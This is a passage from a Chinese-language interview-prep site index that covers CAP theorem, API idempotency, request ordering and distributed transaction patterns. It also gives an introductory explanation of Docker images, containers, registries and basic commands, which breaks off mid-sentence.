性质。如果为了保证数据一致性，将分区一侧的节点设置为不可用，那么又丧失了 A 性质。除非两个节点可以互相通信，才能既保证 C 又保证 A，这又会导致丧失 P 性质。\n P 指的是分区容错性，分区现象产生后需要容错，容错是指在 A 与 C 之间选择。如果分布式系统没有分区现象（没有出现不一致不可用情况） 本身就没有分区 ，既然没有分区则就更没有分区容错性 P。 无论我设计的系统是 AP 还是 CP 系统如果没有出现不一致不可用。 则该系统就处于 CA 状态 P 的体现前提是得有分区情况存在   文章来源：维基百科 CAP 定理\n 几个常用的 CAP 框架对比       框架 所属     Eureka AP   Zookeeper CP   Consul CP    Eureka     Eureka 保证了可用性，实现最终一致性。\n Eureka 所有节点都是平等的所有数据都是相同的，且 Eureka 可以相互交叉注册。\nEureka client 使用内置轮询负载均衡器去注册，有一个检测间隔时间，如果在一定时间内没有收到心跳，才会移除该节点注册信息；如果客户端发现当前 Eureka 不可用，会切换到其他的节点，如果所有的 Eureka 都跪了，Eureka client 会使用最后一次数据作为本地缓存；所以以上的每种设计都是他不具备一致性的特性。\n注意：因为 EurekaAP 的特性和请求间隔同步机制，在服务更新时候一般会手动通过 Eureka 的 api 把当前服务状态设置为offline，并等待 2 个同步间隔后重新启动，这样就能保证服务更新节点对整体系统的影响\nZookeeper     强一致性\n Zookeeper 在选举 leader 时会停止服务，只有成功选举 leader 成功后才能提供服务，选举时间较长；内部使用 paxos 选举投票机制，只有获取半数以上的投票才能成为 leader，否则重新投票，所以部署的时候最好集群节点不小于 3 的奇数个（但是谁能保证跪掉后节点也是基数个呢）；Zookeeper 健康检查一般是使用 tcp 长链接，在内部网络抖动时或者对应节点阻塞时候都会变成不可用，这里还是比较危险的；\nConsul    和 Zookeeper 一样数据 CP\nConsul 注册时候只有过半的节点都写入成功才认为注册成功；leader 挂掉时，重新选举期间整个 Consul 不可用,保证了强一致性但牺牲了可用性\n有很多 blog 说 Consul 属于 ap，官方已经确认他为 CP 机制 原文地址：https://www.consul.io/docs/intro/vs/serf\n"},{"id":151,"href":"/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/distributed-system-idempotency/","title":"distributed-system-idempotency","parent":"分布式系统","content":"面试题    分布式服务接口的幂等性如何设计（比如不能重复扣款）？\n面试官心理分析    从这个问题开始，面试官就已经进入了实际的生产问题的面试了。\n一个分布式系统中的某个接口，该如何保证幂等性？这个事儿其实是你做分布式系统的时候必须要考虑的一个生产环境的技术问题。啥意思呢？\n你看，假如你有个服务提供一些接口供外部调用，这个服务部署在了 5 台机器上，接着有个接口就是付款接口。然后人家用户在前端上操作的时候，不知道为啥，总之就是一个订单不小心发起了两次支付请求，然后这俩请求分散在了这个服务部署的不同的机器上，好了，结果一个订单扣款扣两次。\n或者是订单系统调用支付系统进行支付，结果不小心因为网络超时了，然后订单系统走了前面我们看到的那个重试机制，咔嚓给你重试了一把，好，支付系统收到一个支付请求两次，而且因为负载均衡算法落在了不同的机器上，尴尬了。。。\n所以你肯定得知道这事儿，否则你做出来的分布式系统恐怕容易埋坑。\n面试题剖析    这个不是技术问题，这个没有通用的一个方法，这个应该结合业务来保证幂等性。\n所谓幂等性，就是说一个接口，多次发起同一个请求，你这个接口得保证结果是准确的，比如不能多扣款、不能多插入一条数据、不能将统计值多加了 1。这就是幂等性。\n其实保证幂等性主要是三点：\n 对于每个请求必须有一个唯一的标识，举个栗子：订单支付请求，肯定得包含订单 id，一个订单 id 最多支付一次，对吧。 每次处理完请求之后，必须有一个记录标识这个请求处理过了。常见的方案是在 mysql 中记录个状态啥的，比如支付之前记录一条这个订单的支付流水。 每次接收请求需要进行判断，判断之前是否处理过。比如说，如果有一个订单已经支付了，就已经有了一条支付流水，那么如果重复发送这个请求，则此时先插入支付流水，orderId 已经存在了，唯一键约束生效，报错插入不进去的。然后你就不用再扣款了。  实际运作过程中，你要结合自己的业务来，比如说利用 Redis，用 orderId 作为唯一键。只有成功插入这个支付流水，才可以执行实际的支付扣款。\n要求是支付一个订单，必须插入一条支付流水，order_id 建一个唯一键 unique key 。你在支付一个订单之前，先插入一条支付流水，order_id 就已经进去了。你就可以写一个标识到 Redis 里面去， set order_id payed ，下一次重复请求过来了，先查 Redis 的 order_id 对应的 value，如果是 payed 就说明已经支付过了，你就别重复支付了。\n"},{"id":152,"href":"/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/distributed-system-interview/","title":"distributed-system-interview","parent":"分布式系统","content":"分布式系统面试连环炮    有一些同学，之前呢主要是做传统行业，或者外包项目，一直是在那种小的公司，技术一直都搞的比较简单。他们有共同的一个问题，就是都没怎么搞过分布式系统，现在互联网公司，一般都是做分布式的系统，大家都不是做底层的分布式系统、分布式存储系统 Hadoop HDFS、分布式计算系统 Hadoop MapReduce / Spark、分布式流式计算系统 Storm。\n分布式业务系统，就是把原来用 Java 开发的一个大块系统，给拆分成多个子系统，多个子系统之间互相调用，形成一个大系统的整体。假设原来你做了一个 OA 系统，里面包含了权限模块、员工模块、请假模块、财务模块，一个工程，里面包含了一堆模块，模块与模块之间会互相去调用，1 台机器部署。现在如果你把这个系统给拆开，权限系统、员工系统、请假系统、财务系统 4 个系统，4 个工程，分别在 4 台机器上部署。一个请求过来，完成这个请求，这个员工系统，调用权限系统，调用请假系统，调用财务系统，4 个系统分别完成了一部分的事情，最后 4 个系统都干完了以后，才认为是这个请求已经完成了。\n 近几年开始兴起和流行 Spring Cloud，刚流行，还没开始普及，目前普及的是 Dubbo，因此这里也主要讲 Dubbo。\n 面试官可能会问你以下问题。\n为什么要进行系统拆分？     为什么要进行系统拆分？如何进行系统拆分？拆分后不用 Dubbo 可以吗？Dubbo 和 thrift 有什么区别呢？  分布式服务框架     说一下的 Dubbo 的工作原理？注册中心挂了可以继续通信吗？ Dubbo 支持哪些序列化协议？说一下 Hessian 的数据结构？PB 知道吗？为什么 PB 的效率是最高的？ Dubbo 负载均衡策略和高可用策略都有哪些？动态代理策略呢？ Dubbo 的 SPI 思想是什么？ 如何基于 Dubbo 进行服务治理、服务降级、失败重试以及超时重试？ 分布式服务接口的幂等性如何设计（比如不能重复扣款）？ 分布式服务接口请求的顺序性如何保证？ 如何自己设计一个类似 Dubbo 的 RPC 框架？  分布式锁     使用 Redis 如何设计分布式锁？使用 zk 来设计分布式锁可以吗？这两种分布式锁的实现方式哪种效率比较高？  分布式事务     分布式事务了解吗？你们如何解决分布式事务问题的？TCC 如果出现网络连不通怎么办？XA 的一致性如何保证？  分布式会话     集群部署时的分布式 Session 如何实现？  "},{"id":153,"href":"/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/distributed-system-request-sequence/","title":"distributed-system-request-sequence","parent":"分布式系统","content":"面试题    分布式服务接口请求的顺序性如何保证？\n面试官心理分析    其实分布式系统接口的调用顺序，也是个问题，一般来说是不用保证顺序的。但是有时候可能确实是需要严格的顺序保证。给大家举个例子，你服务 A 调用服务 B，先插入再删除。好，结果俩请求过去了，落在不同机器上，可能插入请求因为某些原因执行慢了一些，导致删除请求先执行了，此时因为没数据所以啥效果也没有；结果这个时候插入请求过来了，好，数据插入进去了，那就尴尬了。\n本来应该是 “先插入 -\u0026gt; 再删除”，这条数据应该没了，结果现在 “先删除 -\u0026gt; 再插入”，数据还存在，最后你死都想不明白是怎么回事。\n所以这都是分布式系统一些很常见的问题。\n面试题剖析    首先，一般来说，个人建议是，你们从业务逻辑上设计的这个系统最好是不需要这种顺序性的保证，因为一旦引入顺序性保障，比如使用分布式锁，会导致系统复杂度上升，而且会带来效率低下，热点数据压力过大等问题。\n下面我给个我们用过的方案吧，简单来说，首先你得用 Dubbo 的一致性 hash 负载均衡策略，将比如某一个订单 id 对应的请求都给分发到某个机器上去，接着就是在那个机器上，因为可能还是多线程并发执行的，你可能得立即将某个订单 id 对应的请求扔一个内存队列里去，强制排队，这样来确保他们的顺序性。\n但是这样引发的后续问题就很多，比如说要是某个订单对应的请求特别多，造成某台机器成热点怎么办？解决这些问题又要开启后续一连串的复杂技术方案\u0026hellip;\u0026hellip; 曾经这类问题弄的我们头疼不已，所以，还是建议什么呢？\n最好是比如说刚才那种，一个订单的插入和删除操作，能不能合并成一个操作，就是一个删除，或者是其它什么，避免这种问题的产生。\n"},{"id":154,"href":"/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/distributed-transaction/","title":"distributed-transaction","parent":"分布式系统","content":"面试题    分布式事务了解吗？你们是如何解决分布式事务问题的？\n面试官心理分析    只要聊到你做了分布式系统，必问分布式事务，你对分布式事务一无所知的话，确实会很坑，你起码得知道有哪些方案，一般怎么来做，每个方案的优缺点是什么。\n现在面试，分布式系统成了标配，而分布式系统带来的分布式事务也成了标配了。因为你做系统肯定要用事务吧，如果是分布式系统，肯定要用分布式事务吧。先不说你搞过没有，起码你得明白有哪几种方案，每种方案可能有啥坑？比如 TCC 方案的网络问题、XA 方案的一致性问题。\n面试题剖析    分布式事务的实现主要有以下 6 种方案：\n XA 方案 TCC 方案 SAGA 方案 本地消息表 可靠消息最终一致性方案 最大努力通知方案  两阶段提交方案/XA 方案    所谓的 XA 方案，即：两阶段提交，有一个事务管理器的概念，负责协调多个数据库（资源管理器）的事务，事务管理器先问问各个数据库你准备好了吗？如果每个数据库都回复 ok，那么就正式提交事务，在各个数据库上执行操作；如果任何其中一个数据库回答不 ok，那么就回滚事务。\n这种分布式事务方案，比较适合单块应用里，跨多个库的分布式事务，而且因为严重依赖于数据库层面来搞定复杂的事务，效率很低，绝对不适合高并发的场景。如果要玩儿，那么基于 Spring + JTA 就可以搞定，自己随便搜个 demo 看看就知道了。\n这个方案，我们很少用，一般来说某个系统内部如果出现跨多个库的这么一个操作，是不合规的。我可以给大家介绍一下， 现在微服务，一个大的系统分成几十个甚至几百个服务。一般来说，我们的规定和规范，是要求每个服务只能操作自己对应的一个数据库。\n如果你要操作别的服务对应的库，不允许直连别的服务的库，违反微服务架构的规范，你随便交叉胡乱访问，几百个服务的话，全体乱套，这样的一套服务是没法管理的，没法治理的，可能会出现数据被别人改错，自己的库被别人写挂等情况。\n如果你要操作别人的服务的库，你必须是通过调用别的服务的接口来实现，绝对不允许交叉访问别人的数据库。\nTCC 方案    TCC 的全称是： Try 、 Confirm 、 Cancel 。\n Try 阶段：这个阶段说的是对各个服务的资源做检测以及对资源进行锁定或者预留。 Confirm 阶段：这个阶段说的是在各个服务中执行实际的操作。 Cancel 阶段：如果任何一个服务的业务方法执行出错，那么这里就需要进行补偿，就是执行已经执行成功的业务逻辑的回滚操作。（把那些执行成功的回滚）  这种方案说实话几乎很少人使用，我们用的也比较少，但是也有使用的场景。因为这个事务回滚实际上是严重依赖于你自己写代码来回滚和补偿了，会造成补偿代码巨大，非常之恶心。\n比如说我们，一般来说跟钱相关的，跟钱打交道的，支付、交易相关的场景，我们会用 TCC，严格保证分布式事务要么全部成功，要么全部自动回滚，严格保证资金的正确性，保证在资金上不会出现问题。\n而且最好是你的各个业务执行的时间都比较短。\n但是说实话，一般尽量别这么搞，自己手写回滚逻辑，或者是补偿逻辑，实在太恶心了，那个业务代码是很难维护的。\nSaga 方案    金融核心等业务可能会选择 TCC 方案，以追求强一致性和更高的并发量，而对于更多的金融核心以上的业务系统 往往会选择补偿事务，补偿事务处理在 30 多年前就提出了 Saga 理论，随着微服务的发展，近些年才逐步受到大家的关注。目前业界比较公认的是采用 Saga 作为长事务的解决方案。\n基本原理    业务流程中每个参与者都提交本地事务，若某一个参与者失败，则补偿前面已经成功的参与者。下图左侧是正常的事务流程，当执行到 T3 时发生了错误，则开始执行右边的事务补偿流程，反向执行 T3、T2、T1 的补偿服务 C3、C2、C1，将 T3、T2、T1 已经修改的数据补偿掉。\n使用场景    对于一致性要求高、短流程、并发高 的场景，如：金融核心系统，会优先考虑 TCC 方案。而在另外一些场景下，我们并不需要这么强的一致性，只需要保证最终一致性即可。\n比如 很多金融核心以上的业务（渠道层、产品层、系统集成层），这些系统的特点是最终一致即可、流程多、流程长、还可能要调用其它公司的服务。这种情况如果选择 TCC 方案开发的话，一来成本高，二来无法要求其它公司的服务也遵循 TCC 模式。同时流程长，事务边界太长，加锁时间长，也会影响并发性能。\n所以 Saga 模式的适用场景是：\n 业务流程长、业务流程多； 参与者包含其它公司或遗留系统服务，无法提供 TCC 模式要求的三个接口。  优势     一阶段提交本地事务，无锁，高性能； 参与者可异步执行，高吞吐； 补偿服务易于实现，因为一个更新操作的反向操作是比较容易理解的。  缺点     不保证事务的隔离性。  本地消息表    本地消息表其实是国外的 ebay 搞出来的这么一套思想。\n这个大概意思是这样的：\n A 系统在自己本地一个事务里操作同时，插入一条数据到消息表； 接着 A 系统将这个消息发送到 MQ 中去； B 系统接收到消息之后，在一个事务里，往自己本地消息表里插入一条数据，同时执行其他的业务操作，如果这个消息已经被处理过了，那么此时这个事务会回滚，这样保证不会重复处理消息； B 系统执行成功之后，就会更新自己本地消息表的状态以及 A 系统消息表的状态； 如果 B 系统处理失败了，那么就不会更新消息表状态，那么此时 A 系统会定时扫描自己的消息表，如果有未处理的消息，会再次发送到 MQ 中去，让 B 再次处理； 这个方案保证了最终一致性，哪怕 B 事务失败了，但是 A 会不断重发消息，直到 B 那边成功为止。  这个方案说实话最大的问题就在于严重依赖于数据库的消息表来管理事务啥的，如果是高并发场景咋办呢？咋扩展呢？所以一般确实很少用。\n可靠消息最终一致性方案    这个的意思，就是干脆不要用本地的消息表了，直接基于 MQ 来实现事务。比如阿里的 RocketMQ 就支持消息事务。\n大概的意思就是：\n A 系统先发送一个 prepared 消息到 mq，如果这个 prepared 消息发送失败那么就直接取消操作别执行了； 如果这个消息发送成功过了，那么接着执行本地事务，如果成功就告诉 mq 发送确认消息，如果失败就告诉 mq 回滚消息； 如果发送了确认消息，那么此时 B 系统会接收到确认消息，然后执行本地的事务； mq 会自动定时轮询所有 prepared 消息回调你的接口，问你，这个消息是不是本地事务处理失败了，所有没发送确认的消息，是继续重试还是回滚？一般来说这里你就可以查下数据库看之前本地事务是否执行，如果回滚了，那么这里也回滚吧。这个就是避免可能本地事务执行成功了，而确认消息却发送失败了。 这个方案里，要是系统 B 的事务失败了咋办？重试咯，自动不断重试直到成功，如果实在是不行，要么就是针对重要的资金类业务进行回滚，比如 B 系统本地回滚后，想办法通知系统 A 也回滚；或者是发送报警由人工来手工回滚和补偿。 这个还是比较合适的，目前国内互联网公司大都是这么玩儿的，要不你就用 RocketMQ 支持的，要不你就自己基于类似 ActiveMQ？RabbitMQ？自己封装一套类似的逻辑出来，总之思路就是这样子的。  最大努力通知方案    这个方案的大致意思就是：\n 系统 A 本地事务执行完之后，发送个消息到 MQ； 这里会有个专门消费 MQ 的最大努力通知服务，这个服务会消费 MQ 然后写入数据库中记录下来，或者是放入个内存队列也可以，接着调用系统 B 的接口； 要是系统 B 执行成功就 ok 了；要是系统 B 执行失败了，那么最大努力通知服务就定时尝试重新调用系统 B，反复 N 次，最后还是不行就放弃。  你们公司是如何处理分布式事务的？    如果你真的被问到，可以这么说，我们某某特别严格的场景，用的是 TCC 来保证强一致性；然后其他的一些场景基于阿里的 RocketMQ 来实现分布式事务。\n你找一个严格资金要求绝对不能错的场景，你可以说你是用的 TCC 方案；如果是一般的分布式事务场景，订单插入之后要调用库存服务更新库存，库存数据没有资金那么的敏感，可以用可靠消息最终一致性方案。\n友情提示一下，RocketMQ 3.2.6 之前的版本，是可以按照上面的思路来的，但是之后接口做了一些改变，我这里不再赘述了。\n当然如果你愿意，你可以参考可靠消息最终一致性方案来自己实现一套分布式事务，比如基于 RocketMQ 来玩儿。\n"},{"id":155,"href":"/tools/Docker/","title":"Docker","parent":"tools","content":"本文只是对 Docker 的概念做了较为详细的介绍，并不涉及一些像 Docker 环境的安装以及 Docker 的一些常见操作和命令。\n一 认识容器    Docker 是世界领先的软件容器平台，所以想要搞懂 Docker 的概念我们必须先从容器开始说起。\n1.1 什么是容器?    先来看看容器较为官方的解释    一句话概括容器：容器就是将软件打包成标准化单元，以用于开发、交付和部署。\n 容器镜像是轻量的、可执行的独立软件包 ，包含软件运行所需的所有内容：代码、运行时环境、系统工具、系统库和设置。 容器化软件适用于基于 Linux 和 Windows 的应用，在任何环境中都能够始终如一地运行。 容器赋予了软件独立性，使其免受外在环境差异（例如，开发和预演环境的差异）的影响，从而有助于减少团队间在相同基础设施上运行不同软件时的冲突。  再来看看容器较为通俗的解释    如果需要通俗地描述容器的话，我觉得容器就是一个存放东西的地方，就像书包可以装各种文具、衣柜可以放各种衣服、鞋架可以放各种鞋子一样。我们现在所说的容器存放的东西可能更偏向于应用比如网站、程序甚至是系统环境。\n1.2 图解物理机,虚拟机与容器    关于虚拟机与容器的对比在后面会详细介绍到，这里只是通过网上的图片加深大家对于物理机、虚拟机与容器这三者的理解(下面的图片来源于网络)。\n物理机：\n虚拟机：\n容器：\n通过上面这三张抽象图，我们可以大概通过类比概括出： 容器虚拟化的是操作系统而不是硬件，容器之间是共享同一套操作系统资源的。虚拟机技术是虚拟出一套硬件后，在其上运行一个完整操作系统。因此容器的隔离级别会稍低一些。\n 相信通过上面的解释大家对于容器这个既陌生又熟悉的概念有了一个初步的认识，下面我们就来谈谈 Docker 的一些概念。\n二 再来谈谈 Docker 的一些概念    2.1 什么是 Docker?    说实话关于 Docker 是什么并太好说，下面我通过四点向你说明 Docker 到底是个什么东西。\n Docker 是世界领先的软件容器平台。 Docker 使用 Google 公司推出的 Go 语言 进行开发实现，基于 Linux 内核 提供的 CGroup 功能和 namespace 来实现的，以及 AUFS 类的 UnionFS 等技术，对进程进行封装隔离，属于操作系统层面的虚拟化技术。 由于隔离的进程独立于宿主和其它的隔离的进程，因此也称其为容器。 Docker 能够自动执行重复性任务，例如搭建和配置开发环境，从而解放了开发人员以便他们专注在真正重要的事情上：构建杰出的软件。 用户可以方便地创建和使用容器，把自己的应用放入容器。容器还可以进行版本管理、复制、分享、修改，就像管理普通的代码一样。  2.2 Docker 思想     集装箱 标准化： ① 运输方式 ② 存储方式 ③ API 接口 隔离  2.3 Docker 容器的特点     轻量 : 在一台机器上运行的多个 Docker 容器可以共享这台机器的操作系统内核；它们能够迅速启动，只需占用很少的计算和内存资源。镜像是通过文件系统层进行构造的，并共享一些公共文件。这样就能尽量降低磁盘用量，并能更快地下载镜像。 标准 : Docker 容器基于开放式标准，能够在所有主流 Linux 版本、Microsoft Windows 以及包括 VM、裸机服务器和云在内的任何基础设施上运行。 安全 : Docker 赋予应用的隔离性不仅限于彼此隔离，还独立于底层的基础设施。Docker 默认提供最强的隔离，因此应用出现问题，也只是单个容器的问题，而不会波及到整台机器。  2.4 为什么要用 Docker ?     Docker 的镜像提供了除内核外完整的运行时环境，确保了应用运行环境一致性，从而不会再出现 “这段代码在我机器上没问题啊” 这类问题；——一致的运行环境 可以做到秒级、甚至毫秒级的启动时间。大大的节约了开发、测试、部署的时间。——更快速的启动时间 避免公用的服务器，资源会容易受到其他用户的影响。——隔离性 善于处理集中爆发的服务器使用压力；——弹性伸缩，快速扩展 可以很轻易的将在一个平台上运行的应用，迁移到另一个平台上，而不用担心运行环境的变化导致应用无法正常运行的情况。——迁移方便 使用 Docker 可以通过定制应用镜像来实现持续集成、持续交付、部署。——持续交付和部署   三 容器 VS 虚拟机    每当说起容器，我们不得不将其与虚拟机做一个比较。就我而言，对于两者无所谓谁会取代谁，而是两者可以和谐共存。\n简单来说： 容器和虚拟机具有相似的资源隔离和分配优势，但功能有所不同，因为容器虚拟化的是操作系统，而不是硬件，因此容器更容易移植，效率也更高。\n3.1 两者对比图    传统虚拟机技术是虚拟出一套硬件后，在其上运行一个完整操作系统，在该系统上再运行所需应用进程；而容器内的应用进程直接运行于宿主的内核，容器内没有自己的内核，而且也没有进行硬件虚拟。因此容器要比传统虚拟机更为轻便。\n3.2 容器与虚拟机总结      容器是一个应用层抽象，用于将代码和依赖资源打包在一起。 多个容器可以在同一台机器上运行，共享操作系统内核，但各自作为独立的进程在用户空间中运行 。与虚拟机相比， 容器占用的空间较少（容器镜像大小通常只有几十兆），瞬间就能完成启动 。\n  虚拟机 (VM) 是一个物理硬件层抽象，用于将一台服务器变成多台服务器。 管理程序允许多个 VM 在一台机器上运行。每个 VM 都包含一整套操作系统、一个或多个应用、必要的二进制文件和库资源，因此 占用大量空间 。而且 VM 启动也十分缓慢 。\n  通过 Docker 官网，我们知道了这么多 Docker 的优势，但是大家也没有必要完全否定虚拟机技术，因为两者有不同的使用场景。虚拟机更擅长于彻底隔离整个运行环境。例如，云服务提供商通常采用虚拟机技术隔离不同的用户。而 Docker 通常用于隔离不同的应用 ，例如前端，后端以及数据库。\n3.3 容器与虚拟机两者是可以共存的    就我而言，对于两者无所谓谁会取代谁，而是两者可以和谐共存。\n 四 Docker 基本概念    Docker 中有非常重要的三个基本概念，理解了这三个概念，就理解了 Docker 的整个生命周期。\n 镜像（Image） 容器（Container） 仓库（Repository）  理解了这三个概念，就理解了 Docker 的整个生命周期\n4.1 镜像(Image):一个特殊的文件系统    操作系统分为内核和用户空间。对于 Linux 而言，内核启动后，会挂载 root 文件系统为其提供用户空间支持。而 Docker 镜像（Image），就相当于是一个 root 文件系统。\nDocker 镜像是一个特殊的文件系统，除了提供容器运行时所需的程序、库、资源、配置等文件外，还包含了一些为运行时准备的一些配置参数（如匿名卷、环境变量、用户等）。 镜像不包含任何动态数据，其内容在构建之后也不会被改变。\nDocker 设计时，就充分利用 Union FS 的技术，将其设计为分层存储的架构 。镜像实际是由多层文件系统联合组成。\n镜像构建时，会一层层构建，前一层是后一层的基础。每一层构建完就不会再发生改变，后一层上的任何改变只发生在自己这一层。 比如，删除前一层文件的操作，实际不是真的删除前一层的文件，而是仅在当前层标记为该文件已删除。在最终容器运行的时候，虽然不会看到这个文件，但是实际上该文件会一直跟随镜像。因此，在构建镜像的时候，需要额外小心，每一层尽量只包含该层需要添加的东西，任何额外的东西应该在该层构建结束前清理掉。\n分层存储的特征还使得镜像的复用、定制变的更为容易。甚至可以用之前构建好的镜像作为基础层，然后进一步添加新的层，以定制自己所需的内容，构建新的镜像。\n4.2 容器(Container):镜像运行时的实体    镜像（Image）和容器（Container）的关系，就像是面向对象程序设计中的 类 和 实例 一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等 。\n容器的实质是进程，但与直接在宿主执行的进程不同，容器进程运行于属于自己的独立的 命名空间。前面讲过镜像使用的是分层存储，容器也是如此。\n容器存储层的生存周期和容器一样，容器消亡时，容器存储层也随之消亡。因此，任何保存于容器存储层的信息都会随容器删除而丢失。\n按照 Docker 最佳实践的要求，容器不应该向其存储层内写入任何数据 ，容器存储层要保持无状态化。所有的文件写入操作，都应该使用数据卷（Volume）、或者绑定宿主目录，在这些位置的读写会跳过容器存储层，直接对宿主(或网络存储)发生读写，其性能和稳定性更高。数据卷的生存周期独立于容器，容器消亡，数据卷不会消亡。因此， 使用数据卷后，容器可以随意删除、重新 run ，数据却不会丢失。\n4.3 仓库(Repository):集中存放镜像文件的地方    镜像构建完成后，可以很容易的在当前宿主上运行，但是， 如果需要在其它服务器上使用这个镜像，我们就需要一个集中的存储、分发镜像的服务，Docker Registry 就是这样的服务。\n一个 Docker Registry 中可以包含多个仓库（Repository）；每个仓库可以包含多个标签（Tag）；每个标签对应一个镜像。所以说：镜像仓库是 Docker 用来集中存放镜像文件的地方类似于我们之前常用的代码仓库。\n通常，一个仓库会包含同一个软件不同版本的镜像，而标签就常用于对应该软件的各个版本 。我们可以通过\u0026lt;仓库名\u0026gt;:\u0026lt;标签\u0026gt;的格式来指定具体是这个软件哪个版本的镜像。如果不给出标签，将以 latest 作为默认标签.。\n这里补充一下 Docker Registry 公开服务和私有 Docker Registry 的概念：\nDocker Registry 公开服务 是开放给用户使用、允许用户管理镜像的 Registry 服务。一般这类公开服务允许用户免费上传、下载公开的镜像，并可能提供收费服务供用户管理私有镜像。\n最常使用的 Registry 公开服务是官方的 Docker Hub ，这也是默认的 Registry，并拥有大量的高质量的官方镜像，网址为：https://hub.docker.com/ 。官方是这样介绍 Docker Hub 的：\n Docker Hub 是 Docker 官方提供的一项服务，用于与您的团队查找和共享容器镜像。\n 比如我们想要搜索自己想要的镜像：\n在 Docker Hub 的搜索结果中，有几项关键的信息有助于我们选择合适的镜像：\n OFFICIAL Image ：代表镜像为 Docker 官方提供和维护，相对来说稳定性和安全性较高。 Stars ：和点赞差不多的意思，类似 GitHub 的 Star。 Dowloads ：代表镜像被拉取的次数，基本上能够表示镜像被使用的频度。  当然，除了直接通过 Docker Hub 网站搜索镜像这种方式外，我们还可以通过 docker search 这个命令搜索 Docker Hub 中的镜像，搜索的结果是一致的。\n➜ ~ docker search mysql NAME DESCRIPTION STARS OFFICIAL AUTOMATED mysql MySQL is a widely used, open-source relation… 8763 [OK] mariadb MariaDB is a community-developed fork of MyS… 3073 [OK] mysql/mysql-server Optimized MySQL Server Docker images. Create… 650 [OK] 在国内访问Docker Hub 可能会比较慢国内也有一些云服务商提供类似于 Docker Hub 的公开服务。比如 时速云镜像库、网易云镜像服务、DaoCloud 镜像市场、阿里云镜像库等。\n除了使用公开服务外，用户还可以在 本地搭建私有 Docker Registry 。Docker 官方提供了 Docker Registry 镜像，可以直接使用做为私有 Registry 服务。开源的 Docker Registry 镜像只提供了 Docker Registry API 的服务端实现，足以支持 docker 命令，不影响使用。但不包含图形界面，以及镜像维护、用户管理、访问控制等高级功能。\n 五 常见命令    5.1 基本命令    docker version # 查看docker版本 docker images # 查看所有已下载镜像，等价于：docker image ls 命令 docker container ls #\t查看所有容器 docker ps #查看正在运行的容器 docker image prune # 清理临时的、没有被使用的镜像文件。-a, --all: 删除所有没有用的镜像，而不仅仅是临时文件； 5.2 拉取镜像    docker search mysql # 查看mysql相关镜像 docker pull mysql:5.7 # 拉取mysql镜像 docker image ls # 查看所有已下载镜像 5.3 删除镜像    比如我们要删除我们下载的 mysql 镜像。\n通过 docker rmi [image] （等价于docker image rm [image]）删除镜像之前首先要确保这个镜像没有被容器引用（可以通过标签名称或者镜像 ID删除）。通过我们前面讲的 docker ps命令即可查看。\n➜ ~ docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES c4cd691d9f80 mysql:5.7 \u0026#34;docker-entrypoint.s…\u0026#34; 7 weeks ago Up 12 days 0.0.0.0:3306-\u0026gt;3306/tcp, 33060/tcp mysql 可以看到 mysql 正在被 id 为 c4cd691d9f80 的容器引用，我们需要首先通过 docker stop c4cd691d9f80 或者 docker stop mysql暂停这个容器。\n然后查看 mysql 镜像的 id\n➜ ~ docker images REPOSITORY TAG IMAGE ID CREATED SIZE mysql 5.7 f6509bac4980 3 months ago 373MB 通过 IMAGE ID 或者 REPOSITORY 名字即可删除\ndocker rmi f6509bac4980 # 或者 docker rmi mysql  六 Build Ship and Run    Docker 的概念以及常见命令基本上已经讲完，我们再来谈谈：Build, Ship, and Run。\n如果你搜索 Docker 官网，会发现如下的字样：“Docker - Build, Ship, and Run Any App, Anywhere”。那么 Build, Ship, and Run 到底是在干什么呢？\n Build（构建镜像） ： 镜像就像是集装箱包括文件以及运行环境等等资源。 Ship（运输镜像） ：主机和仓库间运输，这里的仓库就像是超级码头一样。 Run （运行镜像） ：运行的镜像就是一个容器，容器就是运行程序的地方。  Docker 运行过程也就是去仓库把镜像拉到本地，然后用一条命令把镜像运行起来变成容器。所以，我们也常常将 Docker 称为码头工人或码头装卸工，这和 Docker 的中文翻译搬运工人如出一辙。\n七 简单了解一下 Docker 底层原理    7.1 虚拟化技术    首先，Docker 容器虚拟化技术为基础的软件，那么什么是虚拟化技术呢？\n简单点来说，虚拟化技术可以这样定义：\n 虚拟化技术是一种资源管理技术，是将计算机的各种实体资源)（CPU、内存、磁盘空间、网络适配器等），予以抽象、转换后呈现出来并可供分割、组合为一个或多个电脑配置环境。由此，打破实体结构间的不可切割的障碍，使用户可以比原本的配置更好的方式来应用这些电脑硬件资源。这些资源的新虚拟部分是不受现有资源的架设方式，地域或物理配置所限制。一般所指的虚拟化资源包括计算能力和数据存储。\n 7.2 Docker 基于 LXC 虚拟容器技术    Docker 技术是基于 LXC（Linux container- Linux 容器）虚拟容器技术的。\n LXC，其名称来自 Linux 软件容器（Linux Containers）的缩写，一种操作系统层虚拟化（Operating system–level virtualization）技术，为 Linux 内核容器功能的一个用户空间接口。它将应用软件系统打包成一个软件容器（Container），内含应用软件本身的代码，以及所需要的操作系统核心和库。通过统一的名字空间和共用 API 来分配不同软件容器的可用硬件资源，创造出应用程序的独立沙箱运行环境，使得 Linux 用户可以容易的创建和管理系统或应用容器。\n LXC 技术主要是借助 Linux 内核中提供的 CGroup 功能和 namespace 来实现的，通过 LXC 可以为软件提供一个独立的操作系统运行环境。\ncgroup 和 namespace 介绍：\n  namespace 是 Linux 内核用来隔离内核资源的方式。 通过 namespace 可以让一些进程只能看到与自己相关的一部分资源，而另外一些进程也只能看到与它们自己相关的资源，这两拨进程根本就感觉不到对方的存在。具体的实现方式是把一个或多个进程的相关资源指定在同一个 namespace 中。Linux namespaces 是对全局系统资源的一种封装隔离，使得处于不同 namespace 的进程拥有独立的全局系统资源，改变一个 namespace 中的系统资源只会影响当前 namespace 里的进程，对其他 namespace 中的进程没有影响。\n（以上关于 namespace 介绍内容来自https://www.cnblogs.com/sparkdev/p/9365405.html ，更多关于 namespace 的呢内容可以查看这篇文章 ）。\n  CGroup 是 Control Groups 的缩写，是 Linux 内核提供的一种可以限制、记录、隔离进程组 (process groups) 所使用的物力资源 (如 cpu memory i/o 等等) 的机制。\n（以上关于 CGroup 介绍内容来自 https://www.ibm.com/developerworks/cn/linux/1506_cgroup/index.html ，更多关于 CGroup 的内容可以查看这篇文章 ）。\n  cgroup 和 